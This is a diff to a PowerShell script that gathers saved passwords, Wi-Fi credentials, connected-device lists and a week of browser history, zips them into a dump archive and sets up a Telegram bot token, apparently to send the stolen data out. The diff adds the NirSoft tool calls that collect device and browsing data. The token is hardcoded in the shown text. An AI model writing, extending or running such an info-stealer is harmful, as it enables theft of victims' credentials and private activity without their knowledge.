@@ -36,9 +36,13 @@ Move-Item passwords.txt, wifi.txt -Destination "$dumpFolder"
 Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
 
 # Wait until the ZIP file is created
-while (!(Test-Path "$dumpFile")) {
+while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
     Start-Sleep -Seconds 1
 }
+
+
+.\WNetWatcher.exe /stext connected_devices.txt # Create the file for connected devices
+.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt # Create the file for browser history 
 
 # Telegram configuration
 $token = "7303458194:AAGpVa4Afhhs9-Ktoc2R0vORdkv2IkmQ7qI"
